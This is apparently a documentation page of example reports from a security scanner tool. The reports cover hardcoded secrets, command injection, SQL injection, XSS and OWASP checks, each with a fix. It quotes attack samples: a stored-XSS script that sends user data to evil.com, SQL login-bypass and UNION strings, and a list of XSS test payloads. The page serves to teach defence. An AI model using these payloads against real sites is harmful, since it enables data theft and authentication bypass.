# Security Scanner Examples 🛡️

**Find and fix vulnerabilities before hackers do with @j0kz/security-scanner**

---

## Table of Contents

- [Full Project Security Scan](#full-project-scan)
- [OWASP Top 10 Check](#owasp-check)
- [SQL Injection Detection](#sql-injection)
- [Secret Detection](#secret-detection)
- [XSS Vulnerability Scan](#xss-scan)
- [Dependency Vulnerability Check](#dependency-check)
- [Authentication Security Audit](#auth-audit)
- [API Security Assessment](#api-security)

---

## Full Project Security Scan {#full-project-scan}

### Scenario

You want a complete security assessment before going to production.

### What You Type

```
"Run a full security scan on my project"
```

### Security Scanner Output

````markdown
# Security Scan Report 🔒

**Scan Date:** 2024-01-15 14:30:00
**Files Scanned:** 247
**Total Issues:** 28
**Critical:** 3 | **High:** 7 | **Medium:** 10 | **Low:** 8

## 🔴 Critical Issues (Fix Immediately)

### 1. Hardcoded Database Credentials

**Location:** `src/config/database.js:12`

```javascript
// CRITICAL: Credentials exposed in code
const dbConfig = {
  host: 'prod.database.com',
  user: 'admin',
  password: 'SuperSecret123!', // 🔴 NEVER DO THIS
  database: 'production',
};
```
````

**Fix Required:**

```javascript
// Use environment variables
const dbConfig = {
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
};
```

**Immediate Actions:**

1. Remove from code immediately
2. Rotate credentials
3. Check git history for exposure
4. Add .env to .gitignore

### 2. Command Injection Vulnerability

**Location:** `src/utils/backup.js:45`

```javascript
// CRITICAL: User input directly in shell command
const exec = require('child_process').exec;
function backup(filename) {
  exec(`tar -czf ${filename}.tar.gz /data/*`); // 🔴 Command injection!
}
```

**Fix Required:**

```javascript
const { spawn } = require('child_process');
function backup(filename) {
  // Validate filename
  if (!/^[a-zA-Z0-9_-]+$/.test(filename)) {
    throw new Error('Invalid filename');
  }
  // Use spawn with array arguments (no shell)
  spawn('tar', ['-czf', `${filename}.tar.gz`, '/data/']);
}
```

### 3. Unencrypted Sensitive Data Storage

**Location:** `src/models/User.js:78`

```javascript
// CRITICAL: Storing SSN in plain text
await db.query(
  'INSERT INTO users (email, ssn) VALUES (?, ?)',
  [email, ssn] // 🔴 PII stored unencrypted!
);
```

**Fix Required:**

```javascript
import crypto from 'crypto';

// Encrypt sensitive data
function encryptSSN(ssn) {
  const algorithm = 'aes-256-gcm';
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);

  let encrypted = cipher.update(ssn, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();

  return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
}

await db.query('INSERT INTO users (email, ssn_encrypted) VALUES (?, ?)', [email, encryptSSN(ssn)]);
```

## 🟠 High Priority Issues (Fix This Week)

### 4. SQL Injection in Search

**Location:** `src/api/search.js:23`

```javascript
// HIGH: SQL injection via search query
app.get('/search', async (req, res) => {
  const query = req.query.q;
  const results = await db.query(`SELECT * FROM products WHERE name LIKE '%${query}%'`);
});
```

**Fix:**

```javascript
// Use parameterized queries
const results = await db.query('SELECT * FROM products WHERE name LIKE ?', [`%${query}%`]);
```

### 5. Missing Authentication on Admin Routes

**Location:** `src/routes/admin.js`

```javascript
// HIGH: Admin routes unprotected
router.get('/admin/users', getAllUsers); // 🟠 No auth check!
router.delete('/admin/user/:id', deleteUser); // 🟠 Anyone can delete!
```

**Fix:**

```javascript
import { requireAuth, requireAdmin } from '../middleware/auth';

router.get('/admin/users', requireAuth, requireAdmin, getAllUsers);
router.delete('/admin/user/:id', requireAuth, requireAdmin, deleteUser);
```

### 6. Weak Password Requirements

**Location:** `src/validators/userValidator.js:15`

```javascript
// HIGH: Weak password validation
function validatePassword(password) {
  return password.length >= 6; // 🟠 Too weak!
}
```

**Fix:**

```javascript
function validatePassword(password) {
  const minLength = 12;
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /\d/.test(password);
  const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);

  return password.length >= minLength && hasUpper && hasLower && hasNumber && hasSpecial;
}
```

## 🟡 Medium Priority Issues (Fix This Month)

### 7. Insecure Random Token Generation

**Location:** `src/utils/token.js:8`

```javascript
// MEDIUM: Math.random() is not cryptographically secure
function generateToken() {
  return Math.random().toString(36).substring(2);
}
```

**Fix:**

```javascript
import crypto from 'crypto';

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}
```

### 8. Missing Security Headers

**Analysis:** Security headers not configured

```javascript
// Current: No security headers

// Fix: Add helmet middleware
import helmet from 'helmet';

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
    },
  })
);
```

## Summary Statistics

| Category                | Count | Examples                     |
| ----------------------- | ----- | ---------------------------- |
| Injection               | 5     | SQL, Command, NoSQL          |
| Authentication          | 4     | Weak passwords, Missing auth |
| Data Exposure           | 6     | Hardcoded secrets, Logs      |
| XSS                     | 3     | Reflected, Stored            |
| Misconfigurations       | 8     | Headers, CORS, Cookies       |
| Vulnerable Dependencies | 2     | Outdated packages            |

## Risk Score: 72/100 (HIGH RISK)

## Recommended Actions Priority

1. **Immediate (Today):**
   - Remove hardcoded credentials
   - Fix command injection
   - Encrypt sensitive data

2. **This Week:**
   - Fix SQL injections
   - Add authentication to admin routes
   - Strengthen password requirements

3. **This Month:**
   - Update dependencies
   - Add security headers
   - Implement rate limiting

## Compliance Status

- PCI DSS: ❌ Non-compliant (unencrypted card data)
- GDPR: ❌ Non-compliant (unencrypted PII)
- OWASP Top 10: 4/10 vulnerabilities present
- SOC 2: ❌ Not ready

```

---

## OWASP Top 10 Check {#owasp-check}

### Scenario
You need to verify compliance with OWASP Top 10 security standards.

### What You Type
```

"Check my app against OWASP Top 10"

````

### OWASP Compliance Report

```markdown
# OWASP Top 10 (2021) Compliance Report

## A01: Broken Access Control ❌ FAIL

### Issues Found:
1. **Horizontal privilege escalation possible**
```javascript
// User can access other users' data
app.get('/api/user/:id', (req, res) => {
    // No check if user can access this ID!
    const user = getUserById(req.params.id);
    res.json(user);
});
````

**Fix: Implement proper authorization**

```javascript
app.get('/api/user/:id', authenticate, (req, res) => {
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = getUserById(req.params.id);
  res.json(user);
});
```

2. **Missing function-level access control**
3. **Insecure direct object references**

**Score: 3/10** - Major improvements needed

## A02: Cryptographic Failures ⚠️ PARTIAL

### Issues Found:

1. **Sensitive data transmitted without encryption**
   - WebSocket connections not using WSS
   - Some API endpoints available over HTTP

2. **Weak encryption algorithms**

```javascript
// MD5 is broken - do not use!
const hash = crypto.createHash('md5').update(data).digest('hex');
```

**Fix: Use strong algorithms**

```javascript
// Use SHA-256 or better
const hash = crypto.createHash('sha256').update(data).digest('hex');
```

**Score: 6/10** - Some protection, needs improvement

## A03: Injection ❌ FAIL

### SQL Injection Vulnerabilities: 8 found

### NoSQL Injection: 2 found

### Command Injection: 1 found

**Most Critical:**

```javascript
// SQL Injection
db.query(`SELECT * FROM users WHERE email = '${email}'`);

// NoSQL Injection
db.collection('users').find({ username: req.body.username });

// Command Injection
exec(`convert ${userInput} output.pdf`);
```

**Score: 2/10** - Critical fixes needed

## A04: Insecure Design ⚠️ PARTIAL

### Design Flaws:

1. **No rate limiting on authentication**
2. **Missing threat modeling documentation**
3. **No segregation of production/test data**

**Score: 5/10** - Design review recommended

## A05: Security Misconfiguration ❌ FAIL

### Misconfigurations:

1. **Default passwords unchanged**
2. **Detailed error messages exposed**

```javascript
// Exposes stack trace to users
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // Never expose this!
  });
});
```

3. **Unnecessary features enabled**
4. **Directory listing enabled**

**Score: 3/10** - Harden configurations

## A06: Vulnerable Components ⚠️ PARTIAL

### Vulnerable Dependencies Found:

```json
{
  "vulnerabilities": {
    "high": ["lodash@4.17.15 - Prototype pollution", "axios@0.19.0 - SSRF vulnerability"],
    "medium": ["express@4.16.0 - Open redirect", "jsonwebtoken@8.5.0 - Verification bypass"]
  }
}
```

**Fix: Update all dependencies**

```bash
npm audit fix --force
```

**Score: 6/10** - Updates required

## A07: Identification and Authentication Failures ❌ FAIL

### Issues:

1. **Weak password policy**
2. **No account lockout mechanism**
3. **Session tokens don't expire**
4. **No multi-factor authentication**

**Score: 3/10** - Major improvements needed

## A08: Software and Data Integrity Failures ✅ PASS

### Good Practices Found:

✅ Using package-lock.json
✅ Verifying npm package signatures
✅ CI/CD pipeline has integrity checks

**Score: 8/10** - Good protection

## A09: Security Logging and Monitoring Failures ❌ FAIL

### Issues:

1. **Insufficient logging of security events**
2. **No alerting on suspicious activities**
3. **Logs contain sensitive data**

```javascript
// Bad: Logging passwords!
logger.info(`Login attempt: ${username}:${password}`);
```

**Score: 2/10** - Implement security monitoring

## A10: Server-Side Request Forgery ✅ PASS

### SSRF Protection Found:

✅ URL validation implemented
✅ Whitelist of allowed domains
✅ No user-controlled URLs in requests

**Score: 9/10** - Well protected

## Overall OWASP Score: 4.7/10 ❌

### Critical Actions Required:

1. Fix all injection vulnerabilities
2. Implement proper access controls
3. Add security logging and monitoring
4. Update vulnerable dependencies
5. Strengthen authentication

```

---

## SQL Injection Detection {#sql-injection}

### Scenario
You specifically want to find SQL injection vulnerabilities.

### What You Type
```

"Find all SQL injection vulnerabilities"

````

### SQL Injection Report

```markdown
# SQL Injection Vulnerability Report 💉

## 12 SQL Injection Points Found

### Critical Risk (Direct User Input)

#### 1. Login Bypass Possible
**Location:** `src/auth/login.js:34`
```javascript
// CRITICAL: Authentication bypass possible!
const query = `
    SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'
`;

// Attack vector:
// username: admin' --
// Result: SELECT * FROM users WHERE username = 'admin' --' AND password = ''
// Logs in as admin without password!
````

**Secure Fix:**

```javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
const [user] = await db.execute(query, [username, hashedPassword]);
```

#### 2. Data Exfiltration Risk

**Location:** `src/api/products.js:67`

```javascript
// Union-based injection possible
app.get('/products', (req, res) => {
  const category = req.query.category;
  db.query(`SELECT * FROM products WHERE category = '${category}'`);
});

// Attack: category=' UNION SELECT * FROM users--
// Exposes entire users table!
```

### High Risk (Indirect Input)

#### 3. Second-Order Injection

**Location:** `src/services/reportService.js:89`

```javascript
// Data from database used in new query without sanitization
const user = await getUser(id);
const report = await db.query(`
    SELECT * FROM reports
    WHERE department = '${user.department}'
`);
// If user.department contains SQL, it executes!
```

### Medium Risk (Partial Protection)

#### 4. Like Operator Injection

**Location:** `src/search/searchService.js:45`

```javascript
// Partially protected but still vulnerable
const search = req.query.search.replace(/'/g, "''"); // Basic escaping
db.query(`SELECT * FROM items WHERE name LIKE '%${search}%'`);
// Still vulnerable to wildcards and other attacks
```

**Proper Fix:**

```javascript
db.query('SELECT * FROM items WHERE name LIKE ?', [`%${search}%`]);
```

## Injection Detection Patterns Found

### Pattern 1: String Concatenation

```javascript
// Found 8 instances
`SELECT ... WHERE field = '${variable}'`;
"SELECT ... WHERE field = '" + variable + "'";
```

### Pattern 2: Template Literals

```javascript
// Found 4 instances
`INSERT INTO table VALUES ('${val1}', '${val2}')`;
```

### Pattern 3: Dynamic Table/Column Names

```javascript
// Found 2 instances
`SELECT * FROM ${tableName}` // Dangerous!
`ORDER BY ${column} ${direction}`; // SQL injection!
```

## Automated Fix Suggestions

### Quick Fix Script

```javascript
// Run this to fix most SQL injections automatically

const fixSQLInjections = () => {
  // Pattern 1: Replace concatenation with parameters
  replaceInFiles({
    pattern: /query\(`SELECT.*\$\{.*\}`\)/g,
    replacement: match => {
      // Extract query and variables
      const params = extractParams(match);
      return `query('${params.query}', [${params.vars}])`;
    },
  });

  // Pattern 2: Use query builders
  // Convert raw SQL to query builder syntax
  convertToQueryBuilder({
    from: 'db.query(`SELECT * FROM users WHERE id = ${id}`)',
    to: 'db.select().from("users").where("id", id)',
  });
};
```

## Prevention Checklist

✅ **Always use parameterized queries**

```javascript
// Good
db.query('SELECT * FROM users WHERE id = ?', [userId]);
```

✅ **Use query builders or ORMs**

```javascript
// Using Knex.js
knex('users').where('id', userId).select();

// Using Sequelize
User.findOne({ where: { id: userId } });
```

✅ **Validate and sanitize input**

```javascript
// Whitelist allowed values
const allowedColumns = ['name', 'price', 'category'];
if (!allowedColumns.includes(sortBy)) {
  throw new Error('Invalid sort column');
}
```

✅ **Use stored procedures for complex queries**

```sql
CREATE PROCEDURE GetUserById
    @UserId INT
AS
BEGIN
    SELECT * FROM users WHERE id = @UserId
END
```

✅ **Implement least privilege**

```sql
-- Create read-only user for queries
GRANT SELECT ON myapp.* TO 'readonly'@'localhost';
```

## Risk Assessment

| File        | Injections | Risk Level | Fix Effort |
| ----------- | ---------- | ---------- | ---------- |
| login.js    | 2          | Critical   | 30 min     |
| products.js | 3          | High       | 1 hour     |
| search.js   | 4          | Medium     | 2 hours    |
| reports.js  | 3          | High       | 1.5 hours  |

**Total Fix Time: ~5 hours**
**Risk Reduction: 95%**

```

---

## Secret Detection {#secret-detection}

### Scenario
You want to find exposed secrets, API keys, and credentials.

### What You Type
```

"Find all exposed secrets and API keys"

````

### Secret Detection Report

```markdown
# Secret Detection Report 🔑

## 18 Secrets Found (14 High Risk, 4 Medium Risk)

### 🔴 High Risk Secrets (Immediate Action Required)

#### 1. AWS Access Keys
**File:** `src/services/s3Upload.js:12`
```javascript
const AWS = require('aws-sdk');
const s3 = new AWS.S3({
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',  // 🔴 Real AWS key!
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
});
````

**Actions Required:**

1. **Immediately revoke this key in AWS Console**
2. **Check CloudTrail for unauthorized usage**
3. **Create new keys and use environment variables**

#### 2. Database Password

**File:** `config/database.json:8`

```json
{
  "production": {
    "host": "db.production.com",
    "password": "Pr0dP@ssw0rd2024!" // 🔴 Production password!
  }
}
```

#### 3. Stripe API Key

**File:** `src/payments/stripe.js:5`

```javascript
const stripe = require('stripe')('sk_live_EXAMPLE_KEY_REPLACE_ME'); // 🔴 Live key!
```

#### 4. JWT Secret

**File:** `src/auth/jwt.js:3`

```javascript
const JWT_SECRET = 'my-super-secret-key-1234'; // 🔴 Hardcoded secret!
```

### 🟡 Medium Risk Secrets

#### 5. Slack Webhook

**File:** `src/notifications/slack.js:8`

```javascript
const SLACK_WEBHOOK = 'https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX';
```

#### 6. SendGrid API Key

**File:** `.env.example:12`

```bash
SENDGRID_API_KEY=SG.actual_key_here  # 🟡 Real key in example file!
```

### Git History Secrets (Still Accessible!)

```bash
# Found in git history - still accessible!
Commit: a4f3d21 (3 months ago)
File: src/config.js
Secret: MongoDB connection string with password

Commit: b8c9e45 (6 months ago)
File: .env
Secret: Complete production environment file

# To remove from history:
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all
```

### Secret Patterns Detected

| Pattern      | Count | Risk     | Examples                 |
| ------------ | ----- | -------- | ------------------------ |
| API Keys     | 6     | High     | Stripe, AWS, SendGrid    |
| Passwords    | 4     | Critical | Database, Admin, Service |
| Tokens       | 3     | High     | JWT, OAuth, Session      |
| Certificates | 2     | Medium   | SSL private keys         |
| Webhooks     | 3     | Medium   | Slack, Discord, Custom   |

### Environment Variable Audit

```javascript
// Currently hardcoded (BAD):
const API_KEY = 'sk_live_xxxx';
const DB_PASS = 'password123';
const JWT_SECRET = 'secret';

// Should be (GOOD):
const API_KEY = process.env.API_KEY;
const DB_PASS = process.env.DB_PASS;
const JWT_SECRET = process.env.JWT_SECRET;

// With validation:
if (!process.env.API_KEY) {
  throw new Error('API_KEY environment variable is required');
}
```

### .gitignore Audit

```bash
# Currently missing from .gitignore:
.env.local
.env.production
config/secrets.json
*.key
*.pem
*.p12

# Add these lines to .gitignore:
# Secrets and credentials
.env*
!.env.example
config/secrets*
*.key
*.pem
*.p12
*.cer
credentials/
secrets/
```

### Pre-commit Hook to Prevent Secrets

```bash
#!/bin/sh
# .git/hooks/pre-commit

# Patterns to detect
PATTERNS="AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|password.*=.*['\"].*['\"]"

# Check staged files
if git diff --cached --name-only | xargs grep -E "$PATTERNS"; then
    echo "⚠️ Possible secrets detected! Please review and remove."
    exit 1
fi
```

### Remediation Script

```bash
#!/bin/bash
# fix-secrets.sh

echo "🔒 Starting secret remediation..."

# 1. Move secrets to environment variables
echo "Creating .env template..."
cat > .env.example << EOF
# Database
DB_HOST=localhost
DB_USER=
DB_PASSWORD=
DB_NAME=

# AWS
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=

# APIs
STRIPE_KEY=
SENDGRID_KEY=

# Security
JWT_SECRET=
SESSION_SECRET=
EOF

# 2. Update code to use environment variables
echo "Updating code references..."
find ./src -type f -name "*.js" -exec sed -i \
  's/sk_live_[a-zA-Z0-9]*/process.env.STRIPE_KEY/g' {} +

# 3. Scan for remaining secrets
echo "Scanning for remaining secrets..."
npx @j0kz/security-scanner scan-secrets ./

echo "✅ Remediation complete!"
```

## Action Plan

1. **Immediate (Within 1 hour):**
   - Revoke all exposed credentials
   - Check logs for unauthorized access
   - Change all passwords

2. **Today:**
   - Move all secrets to environment variables
   - Update .gitignore
   - Clean git history

3. **This Week:**
   - Implement secret management system (Vault, AWS Secrets Manager)
   - Add pre-commit hooks
   - Set up secret rotation

```

---

## XSS Vulnerability Scan {#xss-scan}

### Scenario
You want to find Cross-Site Scripting vulnerabilities.

### What You Type
```

"Scan for XSS vulnerabilities"

````

### XSS Vulnerability Report

```markdown
# XSS Vulnerability Report 🎯

## 15 XSS Vulnerabilities Found

### 🔴 Stored XSS (Most Dangerous)

#### 1. User Profile Bio - Stored XSS
**Location:** `src/views/profile.ejs:24`
```html
<!-- DANGEROUS: Unescaped user input -->
<div class="bio">
    <%- user.bio %>  <!-- Using <%- allows HTML! -->
</div>

<!-- Attack: User sets bio to: -->
<script>
    fetch('/api/users', {credentials: 'include'})
    .then(r => r.json())
    .then(data => fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    }));
</script>
````

**Fix: Always escape output**

```html
<!-- Safe: HTML escaped -->
<div class="bio">
  <%= user.bio %>
  <!-- Using <%= escapes HTML -->
</div>

<!-- Or sanitize HTML if needed -->
<%- sanitizeHtml(user.bio, { allowedTags: ['b', 'i', 'em', 'strong'] }) %>
```

#### 2. Comment Section - Persistent XSS

**Location:** `src/api/comments.js:45`

```javascript
// Stores raw HTML in database!
app.post('/comments', (req, res) => {
  const comment = req.body.comment; // No sanitization!
  db.save('comments', { text: comment });
});

// Later displayed without escaping
app.get('/post/:id', (req, res) => {
  res.send(`<div>${comment.text}</div>`); // XSS!
});
```

### 🟠 Reflected XSS

#### 3. Search Results Page

**Location:** `src/routes/search.js:23`

```javascript
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
        <h1>Search results for: ${query}</h1>
    `); // Reflected XSS!
});

// Attack URL:
// /search?q=<script>alert('XSS')</script>
```

**Fix: Escape all dynamic content**

```javascript
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`
        <h1>Search results for: ${query}</h1>
    `);
});
```

#### 4. Error Messages

**Location:** `src/middleware/errorHandler.js:12`

```javascript
app.use((err, req, res, next) => {
  res.status(500).send(`
        <h1>Error</h1>
        <p>${err.message}</p>  <!-- XSS if error contains HTML -->
    `);
});
```

### 🟡 DOM-based XSS

#### 5. Client-Side Template Rendering

**Location:** `public/js/app.js:78`

```javascript
// Dangerous: Using innerHTML with user data
function displayMessage(message) {
  document.getElementById('output').innerHTML = message; // DOM XSS!
}

// From URL parameter
const params = new URLSearchParams(window.location.search);
displayMessage(params.get('msg')); // XSS!
```

**Fix: Use textContent or sanitize**

```javascript
// Safe: Using textContent
function displayMessage(message) {
  document.getElementById('output').textContent = message;
}

// Or use DOMPurify for HTML
function displayHTML(html) {
  document.getElementById('output').innerHTML = DOMPurify.sanitize(html);
}
```

## XSS Context Analysis

### HTML Context

```html
<!-- Found 8 instances -->
<div>Hello ${username}</div>
<!-- Need HTML escape -->

Fix: <%= escapeHtml(username) %>
```

### JavaScript Context

```javascript
// Found 4 instances
<script>
    var user = '${username}';  // Need JS escape
</script>

Fix: var user = <%= JSON.stringify(username) %>;
```

### URL Context

```html
<!-- Found 2 instances -->
<a href="/user/${userId}">Profile</a>
<!-- Need URL encode -->

Fix: <a href="/user/<%= encodeURIComponent(userId) %>"></a>
```

### CSS Context

```html
<!-- Found 1 instance -->
<style>
  .user { color: ${userColor}; }  <!-- Need CSS escape -->
</style>

Fix: Only allow predefined values
```

## Content Security Policy Configuration

```javascript
// Add CSP headers to prevent XSS
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Remove unsafe-inline!
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);

// Report CSP violations
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; report-uri /csp-report"
  );
  next();
});
```

## XSS Prevention Checklist

### Input Validation

✅ Validate all input on server-side
✅ Use allowlists for acceptable input
✅ Reject or sanitize dangerous characters

### Output Encoding

✅ HTML escape: `< > " ' &`
✅ JavaScript escape: Use JSON.stringify()
✅ URL encode: encodeURIComponent()
✅ CSS escape: Only allow safe values

### Sanitization Libraries

```bash
# Install recommended libraries
npm install --save \
    dompurify \
    escape-html \
    sanitize-html \
    xss
```

### Framework-Specific Protection

```javascript
// React - Automatically escapes
<div>{userInput}</div>  // Safe

// But dangerous with:
<div dangerouslySetInnerHTML={{__html: userInput}} />  // XSS!

// Vue - Automatically escapes
{{ userInput }}  // Safe

// But dangerous with:
<div v-html="userInput"></div>  // XSS!

// Angular - Automatically escapes
<div>{{userInput}}</div>  // Safe

// But dangerous with:
<div [innerHTML]="userInput"></div>  // Sanitized by default
```

## Testing for XSS

```javascript
// XSS test payloads to try
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src=javascript:alert(1)>',
  '<body onload=alert(1)>',
  '"><script>alert(1)</script>',
  "';alert(1);//",
  '<script>alert(String.fromCharCode(88,83,83))</script>',
];

// Automated XSS testing
xssPayloads.forEach(payload => {
  testEndpoint('/search', { q: payload });
  testEndpoint('/comment', { text: payload });
  testEndpoint('/profile', { bio: payload });
});
```

## Fix Priority

| Location    | Type      | Risk     | Fix Time |
| ----------- | --------- | -------- | -------- |
| Comments    | Stored    | Critical | 1 hour   |
| User Bio    | Stored    | Critical | 1 hour   |
| Search      | Reflected | High     | 30 min   |
| Error Pages | Reflected | Medium   | 30 min   |
| Client JS   | DOM       | High     | 2 hours  |

**Total Fix Time: ~5 hours**
**Risk Reduction: 90%**

```

---

## How to Use These Examples

### In Claude/Cursor
```

"Run a security scan on my project"
"Find SQL injection vulnerabilities"
"Check for exposed secrets"
"Scan for XSS vulnerabilities"
"Check OWASP compliance"

````

### Command Line
```bash
# Full security scan
npx @j0kz/security-scanner scan ./

# Specific vulnerability type
npx @j0kz/security-scanner scan-sql ./
npx @j0kz/security-scanner scan-xss ./
npx @j0kz/security-scanner scan-secrets ./

# OWASP check
npx @j0kz/security-scanner owasp-check ./
````

### CI/CD Integration

```yaml
- name: Security Scan
  run: |
    npx @j0kz/security-scanner scan ./ \
      --fail-on critical \
      --output security-report.json
```

---

**Next:** [Refactor Assistant Examples](./refactor-assistant.md) | [Back to Index](../README.md)
